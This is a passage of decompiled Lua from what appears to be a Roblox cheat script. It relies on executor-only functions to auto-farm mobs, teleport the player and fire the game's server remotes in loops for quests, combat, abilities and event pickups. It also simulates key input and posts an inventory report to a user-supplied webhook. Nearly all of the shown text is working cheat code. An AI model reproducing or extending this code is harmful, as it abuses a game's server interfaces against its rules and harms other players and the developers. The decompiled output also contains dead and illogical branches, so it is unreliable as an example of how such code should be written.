                                    findFirstChildResult3 = findFirstChildResult
                                else
                                    if not findFirstChildResult3 then
                                        continue
                                    end
                                end
                            end
                        end
                    end
                end
            end
            break
        end
        iterationCursor = savedIterations2[3]
        iterationLimit = savedIterations2[2]
        iterationStep = savedIterations2[5]
        savedIterations = savedIterations2[1]
        if findFirstChildResult3 then
            capturedCallback8((capturedCallback13(findFirstChildResult3.HumanoidRootPart)))
            if not ((not environment._G.AutoEquipEnabled) or not environment._G.SelectedWeaponGroup) then
                capturedCallback15(environment._G.SelectedWeaponGroup)
            end
            capturedCallback14()
        end
        return
    end, closureEnvironment)
end

function functions.handleNewAtLine69(
    closureEnvironment,
    capturedLocalPlayer2,
    capturedUserInputService,
    capturedCreateWindowResult,
    capturedVirtualInputManager
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local anchorPoint, backgroundColor3, callResults, callResults2, cornerRadius, image, instanceObject, instanceObject2, item, mouseButton1Click, parent, parent2
        local parent3, parent4, parent5, position, size, value
        value = capturedLocalPlayer2
        parent2 = value.WaitForChild(value, "PlayerGui", 5)
        if not parent2 then
            return
        else
            parent5 = parent2
            parent = parent5.FindFirstChild(parent5, "LCtrlCircleButtonUI")
            if not parent then
                parent = (environment.Instance.new("ScreenGui"))
                parent.Name = "LCtrlCircleButtonUI"
                parent.ResetOnSpawn = false
                parent.Parent = parent2
            end
            image = ""
            if
                not (
                    ((not environment.isfile) or not environment.writefile) or not environment.getcustomasset
                )
            then
                if not (environment.isfile("Zynx.png")) then
                    callResults = runtime.pack(environment.pcall(functions.handleHttpGet(environment)))
                    callResults2 = callResults
                    item = callResults2[2]
                    if callResults2[1] then
                        environment.writefile("Zynx.png", item)
                    end
                end
                if environment.isfile("Zynx.png") then
                    image = (environment.getcustomasset("Zynx.png"))
                end
            end
            parent3 = parent
            if not (parent3.FindFirstChild(parent3, "ToggleButton")) then
                parent4 = (environment.Instance.new("ImageButton"))
                parent4.Name = "ToggleButton"
                size = environment.UDim2.new(0, 60, 0, 60)
                parent4.Size = size
                anchorPoint = environment.Vector2.new(0.5, 0.5)
                parent4.AnchorPoint = anchorPoint
                position = environment.UDim2.new(0.3, 0, 0.2, 0)
                parent4.Position = position
                backgroundColor3 = environment.Color3.fromRGB(0, 0, 0)
                parent4.BackgroundColor3 = backgroundColor3
                parent4.BackgroundTransparency = 0.5
                parent4.BorderSizePixel = 0
                parent4.ZIndex = 10
                parent4.Active = true
                parent4.Draggable = true
                instanceObject = environment.Instance.new("UIStroke")
                if image ~= "" then
                    parent4.Image = image
                end
                parent4.Parent = parent
                instanceObject2 = environment.Instance.new("UICorner")
                cornerRadius = environment.UDim.new(0, 8)
                instanceObject2.CornerRadius = cornerRadius
                instanceObject2.Parent = parent4
                mouseButton1Click = parent4.MouseButton1Click
                mouseButton1Click.Connect(
                    mouseButton1Click,
                    functions.handleSendKeyEventAtLine100(
                        environment,
                        capturedUserInputService,
                        capturedCreateWindowResult,
                        capturedVirtualInputManager
                    )
                )
            end
            return
        end
    end, closureEnvironment)
end

function functions.handleHttpGet(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local gameValue
        gameValue = environment.game
        return gameValue.HttpGet(gameValue, "https://img2.pic.in.th/Hub.png")
    end, closureEnvironment)
end

function functions.handleSendKeyEventAtLine100(
    closureEnvironment,
    capturedUserInputService,
    capturedCreateWindowResult,
    capturedVirtualInputManager
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local value, value2, value3
        if (not capturedUserInputService.TouchEnabled) or capturedUserInputService.KeyboardEnabled then
            value = capturedVirtualInputManager
            value.SendKeyEvent(value, true, environment.Enum.KeyCode.LeftControl, false, environment.game)
            environment.task.wait(0.05)
            value2 = capturedVirtualInputManager
            value2.SendKeyEvent(value2, false, environment.Enum.KeyCode.LeftControl, false, environment.game)
        else
            if capturedCreateWindowResult then
                value3 = capturedCreateWindowResult
                value3.Minimize(value3)
            end
        end
        return
    end, closureEnvironment)
end

function functions.callback3(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local webhookURL = ...
        local gValue
        gValue = environment._G
        gValue.WebhookURL = webhookURL
        return
    end, closureEnvironment)
end

function functions.handleCallback18(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local autoSkill = ...
        local gValue
        gValue = environment._G
        gValue.AutoSkill = autoSkill
        return
    end, closureEnvironment)
end

function functions.handleCallback19(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local selectedSaberAlterDifficulty = ...
        local gValue
        gValue = environment._G
        gValue.SelectedSaberAlterDifficulty = selectedSaberAlterDifficulty
        return
    end, closureEnvironment)
end

function functions.handleCallback20(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local selectedRimuruDifficulty = ...
        local gValue
        gValue = environment._G
        gValue.SelectedRimuruDifficulty = selectedRimuruDifficulty
        return
    end, closureEnvironment)
end

function functions.handleSpawn3(
    closureEnvironment,
    capturedItemsState2,
    capturedValues2,
    capturedAutoFarmState,
    capturedItems41,
    capturedCallback6
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        if argument1 then
            environment.task.spawn(
                functions.handlePcall3(
                    environment,
                    capturedItemsState2,
                    capturedValues2,
                    capturedAutoFarmState,
                    capturedItems41,
                    capturedCallback6
                )
            )
        end
        return
    end, closureEnvironment)
end

function functions.handlePcall3(
    closureEnvironment,
    capturedItemsState2,
    capturedValues2,
    capturedAutoFarmState,
    capturedItems41,
    capturedCallback6
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        environment.pcall(
            functions.handleCallbackAtLine10(
                environment,
                capturedItemsState2,
                capturedValues2,
                capturedAutoFarmState,
                capturedItems41,
                capturedCallback6
            )
        )
        return
    end, closureEnvironment)
end

function functions.handleCallbackAtLine10(
    closureEnvironment,
    capturedItemsState2,
    capturedValues2,
    capturedAutoFarmState,
    capturedItems41,
    capturedCallback6
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local iterationCursor, iterationCursor2, iterationCursor3, iterationLimit, iterationLimit2, iterationStep, iterationStep2, matches, savedIterations, savedIterations2, value, value2
        local value3
        capturedItemsState2.value = false
        value2 = capturedValues2[capturedAutoFarmState.value]
        if environment._G.SelectedAllMobs then
            savedIterations = { nil, [5] = nil, nil, nil }
            iterationStep = (1 + 0)
            iterationLimit = (#capturedValues2 + 0)
            iterationCursor = (1 - iterationStep)
            while true do
                iterationCursor = (iterationCursor + iterationStep)
                if iterationStep <= 0 then
                    matches = (iterationCursor >= iterationLimit)
                else
                    matches = (iterationCursor <= iterationLimit)
                end
                if matches then
                    iterationCursor3 = iterationCursor
                end
                if matches then
                    value = capturedValues2[iterationCursor3]
                    if not environment._G.SelectedAllMobs[value] then
                        continue
                    else
                        value2 = value
                        capturedAutoFarmState.value = iterationCursor3
                    end
                end
                break
            end
            iterationCursor2 = savedIterations[3]
            iterationLimit2 = savedIterations[2]
            iterationStep2 = savedIterations[5]
            savedIterations2 = savedIterations[1]
        end
        value3 = capturedItems41[value2]
        if not ((not value3) or not value3.Island) then
            capturedCallback6(value3.Island)
        end
        return
    end, closureEnvironment)
end

function functions.handleWaitForChildAtLine70(
    closureEnvironment,
    capturedPcallValueState,
    capturedReplicatedStorage,
    capturedTextValueState,
    capturedSharedValueState,
    capturedSharedValueState2,
    capturedSharedValueState3,
    capturedSharedValueState4,
    capturedSharedValueState5,
    capturedSharedValueState6,
    capturedSharedValueState7
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local value, value2, value3, value4, value5, value6, value7, value8, value9, waitForChildResult, waitForChildResult2, waitForChildResult3
        local waitForChildResult4, waitForChildResult5, waitForChildResult6, waitForChildResult7, waitForChildResult8, waitForChildResult9
        value5 = capturedReplicatedStorage
        waitForChildResult6 = value5.WaitForChild(value5, "RemoteEvents", 5)
        capturedPcallValueState.value = waitForChildResult6
        if capturedPcallValueState.value then
            value8 = capturedPcallValueState.value
            waitForChildResult9 = value8.WaitForChild(value8, "QuestAccept", 5)
            capturedTextValueState.value = waitForChildResult9
            value9 = capturedPcallValueState.value
            waitForChildResult = value9.WaitForChild(value9, "QuestAbandon", 5)
            capturedSharedValueState.value = waitForChildResult
        end
        value3 = capturedReplicatedStorage
        waitForChildResult4 = value3.WaitForChild(value3, "CombatSystem", 5)
        capturedSharedValueState2.value = waitForChildResult4
        if capturedSharedValueState2.value then
            value2 = capturedSharedValueState2.value
            waitForChildResult3 = value2.WaitForChild(value2, "Remotes", 5)
            capturedSharedValueState3.value = waitForChildResult3
            if capturedSharedValueState3.value then
                value4 = capturedSharedValueState3.value
                waitForChildResult5 = value4.WaitForChild(value4, "RequestHit", 5)
                capturedSharedValueState4.value = waitForChildResult5
            end
        end
        value = capturedReplicatedStorage
        waitForChildResult2 = value.WaitForChild(value, "AbilitySystem", 5)
        capturedSharedValueState5.value = waitForChildResult2
        if capturedSharedValueState5.value then
            value7 = capturedSharedValueState5.value
            waitForChildResult8 = value7.WaitForChild(value7, "Remotes", 5)
            capturedSharedValueState6.value = waitForChildResult8
            if capturedSharedValueState6.value then
                value6 = capturedSharedValueState6.value
                waitForChildResult7 = value6.WaitForChild(value6, "RequestAbility", 5)
                capturedSharedValueState7.value = waitForChildResult7
            end
        end
        return
    end, closureEnvironment)
end

function functions.handleFindFirstChild5(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local argument12, backpack, gameValue, localPlayer, localPlayer2
        argument12 = argument1
        gameValue = environment.game
        localPlayer = (gameValue.GetService(gameValue, "Players")).LocalPlayer
        localPlayer2 = localPlayer
        if not (localPlayer2.FindFirstChild(localPlayer2, "Backpack")) then
            return true
        else
            backpack = localPlayer.Backpack
            if not (backpack.FindFirstChild(backpack, argument12)) then
                return true
            else
                return true
            end
        end
    end, closureEnvironment)
end

function functions.handleSpawn4(
    closureEnvironment,
    capturedOptions,
    capturedCallback9,
    capturedNewResult4,
    capturedCallback10,
    capturedCallback11,
    capturedItems47
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        if argument1 then
            environment.task.spawn(
                functions.handleWaitAtLine122(
                    environment,
                    capturedOptions,
                    capturedCallback9,
                    capturedNewResult4,
                    capturedCallback10,
                    capturedCallback11,
                    capturedItems47
                )
            )
        end
        return
    end, closureEnvironment)
end

function functions.handleWaitAtLine122(
    closureEnvironment,
    capturedOptions,
    capturedCallback9,
    capturedNewResult4,
    capturedCallback10,
    capturedCallback11,
    capturedItems47
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        while true do
            if
                not (
                    ((not capturedOptions) or not capturedOptions.AutoJigsawEvent)
                    or not capturedOptions.AutoJigsawEvent.Value
                )
            then
                if not environment._G.IsPortaling then
                    environment.pcall(
                        functions.handleWaitAtLine23(
                            environment,
                            capturedCallback9,
                            capturedNewResult4,
                            capturedOptions,
                            capturedCallback10,
                            capturedCallback11,
                            capturedItems47
                        )
                    )
                else
                    environment.task.wait(1)
                end
                environment.task.wait(1)
                continue
            end
            break
        end
        return
    end, closureEnvironment)
end

function functions.handleWaitAtLine23(
    closureEnvironment,
    capturedCallback9,
    capturedNewResult4,
    capturedOptions,
    capturedCallback10,
    capturedCallback11,
    capturedItems47
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local gameValue, iterationCursor, iterationCursor2, iterationCursor3, iterationCursor4, iterationCursor5, iterationCursor6, iterationLimit, iterationLimit2, iterationLimit3, iterationLimit4, iterationLimit5
        local iterationStep, iterationStep2, iterationStep3, iterationStep4, iterationStep5, matches, matches2, matches3, savedIterations, savedIterations2, savedIterations3, savedIterations4
        local savedIterations5, value, value2, value3, value4, value5
        capturedCallback9(capturedNewResult4.Position)
        environment.task.wait(1.5)
        if not capturedOptions.AutoJigsawEvent.Value then
            return
        else
            capturedCallback10(capturedNewResult4, 15, capturedOptions.AutoJigsawEvent)
            if not capturedOptions.AutoJigsawEvent.Value then
                return
            else
                savedIterations5 = { nil, [5] = nil, nil, nil }
                iterationStep = (1 + 0)
                iterationLimit = (3 + 0)
                iterationCursor = (1 - iterationStep)
                while true do
                    iterationCursor = (iterationCursor + iterationStep)
                    if iterationStep <= 0 then
                        matches3 = (iterationCursor >= iterationLimit)
                    else
                        matches3 = (iterationCursor <= iterationLimit)
                    end
                    if matches3 then
                        if not capturedOptions.AutoJigsawEvent.Value then
                            return
                        else
                            capturedCallback11()
                            environment.task.wait(0.5)
                            continue
                        end
                    end
                    break
                end
                iterationCursor4 = savedIterations5[3]
                iterationLimit2 = savedIterations5[2]
                iterationStep2 = savedIterations5[5]
                savedIterations = savedIterations5[1]
                gameValue = environment.game
                value = (gameValue.GetService(gameValue, "ReplicatedStorage"))
                value2 = (value.WaitForChild(value, "Remotes"))
                value3 = (value2.WaitForChild(value2, "EventRemotes"))
                value4 = (value3.WaitForChild(value3, "GetEvents"))
                value4.InvokeServer(value4)
                environment.task.wait(1)
                iterationCursor3 = nil
                savedIterations2 =
                    { savedIterations, [5] = iterationStep2, iterationLimit2, iterationCursor4 }
                iterationStep3 = (1 + 0)
                iterationLimit3 = (6 + 0)
                iterationCursor2 = (1 - iterationStep3)
                while true do
                    iterationCursor2 = (iterationCursor2 + iterationStep3)
                    if iterationStep3 <= 0 then
                        matches = (iterationCursor2 >= iterationLimit3)
                    else
                        matches = (iterationCursor2 <= iterationLimit3)
                    end
                    if matches then
                        iterationCursor3 = iterationCursor2
                    end
                    if
                        (matches and capturedOptions.AutoJigsawEvent.Value)
                        and not environment._G.IsPortaling
                    then
                        value5 = capturedItems47[("Jigsaw #" .. iterationCursor3)]
                        if not value5 then
                            continue
                        else
                            capturedCallback9(value5.Position)
                            environment.task.wait(1.5)
                            if not capturedOptions.AutoJigsawEvent.Value then
                                return
                            else
                                capturedCallback10(value5, 15, capturedOptions.AutoJigsawEvent)
                                if not capturedOptions.AutoJigsawEvent.Value then
                                    return
                                else
                                    savedIterations4 = {
                                        savedIterations2,
                                        [5] = iterationStep3,
                                        iterationLimit3,
                                        iterationCursor2,
                                    }
                                    iterationStep5 = (1 + 0)
                                    iterationLimit5 = (5 + 0)
                                    iterationCursor6 = (1 - iterationStep5)
                                    while true do
                                        iterationCursor6 = (iterationCursor6 + iterationStep5)
                                        if iterationStep5 <= 0 then
                                            matches2 = (iterationCursor6 >= iterationLimit5)
                                        else
                                            matches2 = (iterationCursor6 <= iterationLimit5)
                                        end
                                        if matches2 then
                                            if not capturedOptions.AutoJigsawEvent.Value then
                                                return
                                            else
                                                capturedCallback11()
                                                environment.task.wait(0.3)
                                                continue
                                            end
                                        end
                                        break
                                    end
                                    iterationCursor2 = savedIterations4[3]
                                    iterationLimit3 = savedIterations4[2]
                                    iterationStep3 = savedIterations4[5]
                                    savedIterations2 = savedIterations4[1]
                                    continue
                                end
                            end
                        end
                    end
                    break
                end
                iterationCursor5 = savedIterations2[3]
                iterationLimit4 = savedIterations2[2]
                iterationStep4 = savedIterations2[5]
                savedIterations3 = savedIterations2[1]
                return
            end
        end
    end, closureEnvironment)
end

function functions.handleSpawn5(
    closureEnvironment,
    capturedOptions,
    capturedCallback9,
    capturedNewResult3,
    capturedCallback10,
    capturedCallback11,
    capturedItems48
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        if argument1 then
            environment.task.spawn(
                functions.handleWait2(
                    environment,
                    capturedOptions,
                    capturedCallback9,
                    capturedNewResult3,
                    capturedCallback10,
                    capturedCallback11,
                    capturedItems48
                )
            )
        end
        return
    end, closureEnvironment)
end

function functions.handleWait2(
    closureEnvironment,
    capturedOptions,
    capturedCallback9,
    capturedNewResult3,
    capturedCallback10,
    capturedCallback11,
    capturedItems48
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        while true do
            if
                not (
                    not capturedOptions
                    or (
                        not capturedOptions.AutoDemoniteEvent or not capturedOptions.AutoDemoniteEvent.Value
                    )
                )
            then
                if not environment._G.IsPortaling then
                    environment.pcall(
                        functions.handleWaitAtLine49(
                            environment,
                            capturedCallback9,
                            capturedNewResult3,
                            capturedOptions,
                            capturedCallback10,
                            capturedCallback11,
                            capturedItems48
                        )
                    )
                else
                    environment.task.wait(1)
                end
                environment.task.wait(1)
                continue
            end
            break
        end
        return
    end, closureEnvironment)
end

function functions.handleWaitAtLine49(
    closureEnvironment,
    capturedCallback9,
    capturedNewResult3,
    capturedOptions,
    capturedCallback10,
    capturedCallback11,
    capturedItems48
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local gameValue, iterationCursor, iterationCursor2, iterationCursor3, iterationCursor4, iterationCursor5, iterationCursor6, iterationLimit, iterationLimit2, iterationLimit3, iterationLimit4, iterationLimit5
        local iterationStep, iterationStep2, iterationStep3, iterationStep4, iterationStep5, matches, matches2, matches3, savedIterations, savedIterations2, savedIterations3, savedIterations4
        local savedIterations5, value, value2, value3, value4, value5
        capturedCallback9(capturedNewResult3.Position)
        environment.task.wait(1.5)
        if not capturedOptions.AutoDemoniteEvent.Value then
            return
        else
            capturedCallback10(capturedNewResult3, 15, capturedOptions.AutoDemoniteEvent)
            if not capturedOptions.AutoDemoniteEvent.Value then
                return
            else
                savedIterations = { nil, [5] = nil, nil, nil }
                iterationStep2 = (1 + 0)
                iterationLimit2 = (3 + 0)
                iterationCursor4 = (1 - iterationStep2)
                while true do
                    iterationCursor4 = (iterationCursor4 + iterationStep2)
                    if iterationStep2 <= 0 then
                        matches2 = (iterationCursor4 >= iterationLimit2)
                    else
                        matches2 = (iterationCursor4 <= iterationLimit2)
                    end
                    if matches2 then
                        if not capturedOptions.AutoDemoniteEvent.Value then
                            return
                        else
                            capturedCallback11()
                            environment.task.wait(0.5)
                            continue
                        end
                    end
                    break
                end
                iterationCursor5 = savedIterations[3]
                iterationLimit4 = savedIterations[2]
                iterationStep4 = savedIterations[5]
                savedIterations3 = savedIterations[1]
                gameValue = environment.game
                value = (gameValue.GetService(gameValue, "ReplicatedStorage"))
                value2 = (value.WaitForChild(value, "Remotes"))
                value3 = (value2.WaitForChild(value2, "EventRemotes"))
                value4 = (value3.WaitForChild(value3, "GetEvents"))
                value4.InvokeServer(value4)
                environment.task.wait(1)
                iterationCursor3 = nil
                savedIterations2 =
                    { savedIterations3, [5] = iterationStep4, iterationLimit4, iterationCursor5 }
                iterationStep3 = (1 + 0)
                iterationLimit3 = (2 + 0)
                iterationCursor2 = (1 - iterationStep3)
                while true do
                    iterationCursor2 = (iterationCursor2 + iterationStep3)
                    if iterationStep3 <= 0 then
                        matches = (iterationCursor2 >= iterationLimit3)
                    else
                        matches = (iterationCursor2 <= iterationLimit3)
                    end
                    if matches then
                        iterationCursor3 = iterationCursor2
                    end
                    if
                        (matches and capturedOptions.AutoDemoniteEvent.Value)
                        and not environment._G.IsPortaling
                    then
                        value5 = capturedItems48[("Demonite #" .. iterationCursor3)]
                        if not value5 then
                            continue
                        else
                            capturedCallback9(value5.Position)
                            environment.task.wait(1.5)
                            if not capturedOptions.AutoDemoniteEvent.Value then
                                return
                            else
                                capturedCallback10(value5, 15, capturedOptions.AutoDemoniteEvent)
                                if not capturedOptions.AutoDemoniteEvent.Value then
                                    return
                                else
                                    savedIterations5 = {
                                        savedIterations2,
                                        [5] = iterationStep3,
                                        iterationLimit3,
                                        iterationCursor2,
                                    }
                                    iterationStep = (1 + 0)
                                    iterationLimit = (5 + 0)
                                    iterationCursor = (1 - iterationStep)
                                    while true do
                                        iterationCursor = (iterationCursor + iterationStep)
                                        if iterationStep <= 0 then
                                            matches3 = (iterationCursor >= iterationLimit)
                                        else
                                            matches3 = (iterationCursor <= iterationLimit)
                                        end
                                        if matches3 then
                                            if not capturedOptions.AutoDemoniteEvent.Value then
                                                return
                                            else
                                                capturedCallback11()
                                                environment.task.wait(0.3)
                                                continue
                                            end
                                        end
                                        break
                                    end
                                    iterationCursor2 = savedIterations5[3]
                                    iterationLimit3 = savedIterations5[2]
                                    iterationStep3 = savedIterations5[5]
                                    savedIterations2 = savedIterations5[1]
                                    continue
                                end
                            end
                        end
                    end
                    break
                end
                iterationCursor6 = savedIterations2[3]
                iterationLimit5 = savedIterations2[2]
                iterationStep5 = savedIterations2[5]
                savedIterations4 = savedIterations2[1]
                return
            end
        end
    end, closureEnvironment)
end

function functions.selectedAllMobs(
    closureEnvironment,
    capturedItemsState,
    capturedCallback2,
    capturedCallback6
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local value
        if not argument1 then
            capturedItemsState.value = value
        else
            environment.task.spawn(functions.handlePcall4(environment, capturedCallback2, capturedCallback6))
        end
        return
    end, closureEnvironment)
end

function functions.handlePcall4(closureEnvironment, capturedCallback2, capturedCallback6)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        environment.pcall(
            functions.handleCallbackAtLine108(environment, capturedCallback2, capturedCallback6)
        )
        return
    end, closureEnvironment)
end

function functions.handleCallbackAtLine108(closureEnvironment, capturedCallback2, capturedCallback6)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local result
        result = capturedCallback2()
        if not ((not result) or not result.Island) then
            capturedCallback6(result.Island)
        end
        return
    end, closureEnvironment)
end

function functions.handleWaitAtLine101(
    closureEnvironment,
    capturedOptions,
    capturedCallback2,
    capturedLocalPlayer2,
    capturedItemsState,
    capturedSharedValueState,
    capturedTextValueState,
    capturedCallback12,
    capturedCallback13,
    capturedCallback8,
    capturedCallback15,
    capturedCallback14,
    capturedCallback,
    capturedCallback5,
    capturedItems44
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        while true do
            environment.task.wait(0.1)
            if (not capturedOptions.AutoFarmLevel) or not capturedOptions.AutoFarmLevel.Value then
                environment.task.wait(0.5)
            else
                if
                    ((not environment._G.BossIsActive) and not environment._G.CheckingBosses)
                    and not environment._G.IsPortaling
                then
                    environment.pcall(
                        functions.handleFindFirstChildAtLine18(
                            environment,
                            capturedCallback2,
                            capturedLocalPlayer2,
                            capturedItemsState,
                            capturedSharedValueState,
                            capturedTextValueState,
                            capturedCallback12,
                            capturedCallback13,
                            capturedCallback8,
                            capturedCallback15,
                            capturedCallback14,
                            capturedCallback,
                            capturedCallback5,
                            capturedItems44
                        )
                    )
                else
                    environment.task.wait(0.5)
                end
            end
            continue
        end
    end, closureEnvironment)
end

function functions.handleFindFirstChildAtLine18(
    closureEnvironment,
    capturedCallback2,
    capturedLocalPlayer2,
    capturedItemsState,
    capturedSharedValueState,
    capturedTextValueState,
    capturedCallback12,
    capturedCallback13,
    capturedCallback8,
    capturedCallback15,
    capturedCallback14,
    capturedCallback,
    capturedCallback5,
    capturedItems44
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, callResults2, callResults3, callResults4, callResults5, callResults6, character, enemies, find, hasNext, hasNext2, huge
        local humanoidRootPart, items, items2, iterationCursor, iterationCursor2, iterationCursor3, iterationLimit, iterationLimit2, iterationStep, iterationStep2, iteratorKey, iteratorKey2
        local iteratorValue, iteratorValue2, iteratorValue3, iteratorValue4, iteratorValue5, iteratorValue6, iteratorValue7, iteratorValue8, magnitude, mobs, nPCs, name
        local pairsValue, questNPC, result, result2, result3, result4, savedIterations, savedIterations2, savedIterations3, value, value2, value3
        local value4, workspaceValue, workspaceValue2, workspaceValue3, workspaceValue4
        result = capturedCallback2()
        humanoidRootPart = capturedLocalPlayer2.Character
        if humanoidRootPart then
            character = capturedLocalPlayer2.Character
            humanoidRootPart = character.FindFirstChild(character, "HumanoidRootPart")
        end
        if not ((not result) or not humanoidRootPart) then
            if capturedItemsState.value ~= result.QuestNPC then
                if capturedSharedValueState.value then
                    value3 = capturedSharedValueState.value
                    value3.FireServer(value3, "repeatable")
                    if capturedItemsState.value then
                        value = capturedSharedValueState.value
                        value.FireServer(value, capturedItemsState.value)
                    end
                    value2 = capturedSharedValueState.value
                    value2.FireServer(value2)
                    environment.task.wait(0.8)
                end
                questNPC = result.QuestNPC
                capturedItemsState.value = questNPC
            end
            if not ((not capturedTextValueState.value) or not (capturedCallback12())) then
                value4 = capturedTextValueState.value
                value4.FireServer(value4, result.QuestNPC)
                environment.task.wait(0.2)
            end
            iteratorValue2 = nil
            huge = environment.math.huge
            items = runtime.create(3)
            workspaceValue = environment.workspace
            enemies = workspaceValue.FindFirstChild(workspaceValue, "Enemies")
            workspaceValue2 = environment.workspace
            mobs = workspaceValue2.FindFirstChild(workspaceValue2, "Mobs")
            workspaceValue3 = environment.workspace
            nPCs = workspaceValue3.FindFirstChild(workspaceValue3, "NPCs")
            workspaceValue4 = environment.workspace
            callResults = runtime.pack(workspaceValue4.FindFirstChild(workspaceValue4, "Npcs"))
            items2 = items
            runtime.move({ enemies, mobs, nPCs }, 1, 3, 1, items2)
            runtime.move(callResults, 1, (((callResults.n + 9) - 1) - 8), 4, items2)
            callResults2 = runtime.pack(environment.pairs(items))
            callResults3 = callResults2
            savedIterations = { nil, [5] = nil, nil, nil }
            result3 = runtime.wrapIterator(runtime.iteratorBody1)
            result3(callResults3[1], callResults3[2], callResults3[3])
            iteratorValue6 = nil
            iterationCursor = result3
            while true do
                hasNext2, iteratorKey2, iteratorValue5 = iterationCursor()
                if not hasNext2 then
                else
                    iteratorValue6 = iteratorValue5
                end
                if hasNext2 then
                    if iteratorValue6 then
                        pairsValue = environment.pairs
                        iteratorValue7 = iteratorValue6
                        callResults4 = runtime.pack(iteratorValue7.GetChildren(iteratorValue7))
                        callResults5 = runtime.pack(
                            pairsValue(runtime.unpack(callResults4, 1, (((callResults4.n + 10) - 1) - 9)))
                        )
                        callResults6 = callResults5
                        savedIterations3 =
                            { savedIterations, [5] = iterationStep, iterationLimit, iterationCursor }
                        result4 = runtime.wrapIterator(runtime.iteratorBody1)
                        result4(callResults6[1], callResults6[2], callResults6[3])
                        iteratorValue4 = nil
                        iterationCursor3 = result4
                        while true do
                            hasNext, iteratorKey, iteratorValue3 = iterationCursor3()
                            if not hasNext then
                            else
                                iteratorValue4 = iteratorValue3
                            end
                            if hasNext then
                                if environment.table.find(result.MobNames, iteratorValue4.Name) then
                                    iteratorValue = iteratorValue4
                                    if
                                        not (
                                            not (iteratorValue.FindFirstChild(iteratorValue, "Humanoid"))
                                            or not (0 < iteratorValue4.Humanoid.Health)
                                        )
                                    then
                                        iteratorValue8 = iteratorValue4
                                        if
                                            iteratorValue8.FindFirstChild(iteratorValue8, "HumanoidRootPart")
                                        then
                                            find = environment.string.find
                                            name = iteratorValue4.Name
                                            if not (find((name.lower(name)), "dummy")) then
                                                magnitude = (
                                                    (
                                                        humanoidRootPart.Position
                                                        - iteratorValue4.HumanoidRootPart.Position
                                                    )
                                                ).Magnitude
                                                if magnitude < huge then
                                                    huge = magnitude
                                                    iteratorValue2 = iteratorValue4
                                                end
                                            end
                                        end
                                    end
                                end
                                continue
                            end
                            break
                        end
                        iterationCursor = savedIterations3[3]
                        iterationLimit = savedIterations3[2]
                        iterationStep = savedIterations3[5]
                        savedIterations = savedIterations3[1]
                    end
                    continue
                end
                break
            end
            iterationCursor2 = savedIterations[3]
            iterationLimit2 = savedIterations[2]
            iterationStep2 = savedIterations[5]
            savedIterations2 = savedIterations[1]
            if not iteratorValue2 then
                result2 = capturedCallback5((capturedCallback()))
                if not result2 then
                    if not ((not result.Island) or not capturedItems44[result.Island]) then
                        capturedCallback8(
                            (capturedItems44[result.Island] * (environment.CFrame.new(0, 30, 0)))
                        )
                    end
                else
                    capturedCallback8(result2)
                end
            else
                capturedCallback8((capturedCallback13(iteratorValue2.HumanoidRootPart)))
                if not ((not environment._G.AutoEquipEnabled) or not environment._G.SelectedWeaponGroup) then
                    capturedCallback15(environment._G.SelectedWeaponGroup)
                end
                capturedCallback14()
            end
        end
        return
    end, closureEnvironment)
end

function functions.callbackAtLine4(closureEnvironment, capturedCallback3, capturedResult13)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local items, items2, notify, notify2, value, value2
        if environment._G.WebhookURL == "" then
            value = capturedResult13
            notify = value.Notify
            items = {}
            items.Title = "Error"
            items.Content = "กรุณาใส่ลิงก์ Webhook ก่อน"
            items.Duration = 3
            notify(value, items)
        else
            environment.pcall(functions.handleWaitForChildAtLine115(environment))
            environment.task.wait(0.5)
            capturedCallback3()
            value2 = capturedResult13
            notify2 = value2.Notify
            items2 = {}
            items2.Title = "Webhook"
            items2.Content =
                "เรียกข้อมูลและส่งรายงานแล้ว!"
            items2.Duration = 3
            notify2(value2, items2)
        end
        return
    end, closureEnvironment)
end

function functions.handleWaitForChildAtLine115(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local gameValue, value, value2, value3
        gameValue = environment.game
        value = (gameValue.GetService(gameValue, "ReplicatedStorage"))
        value2 = (value.WaitForChild(value, "Remotes"))
        value3 = (value2.WaitForChild(value2, "RequestInventory"))
        value3.FireServer(value3)
        return
    end, closureEnvironment)
end

function functions.selectedAllMobsAtLine1(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local farmPosition = ...
        local gValue
        gValue = environment._G
        gValue.FarmPosition = farmPosition
        return
    end, closureEnvironment)
end

function functions.handleSpawn6(closureEnvironment, capturedCallback9)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local gValue
        if argument1 then
            gValue = environment._G
            gValue.HasWarpedToSaberAlter = false
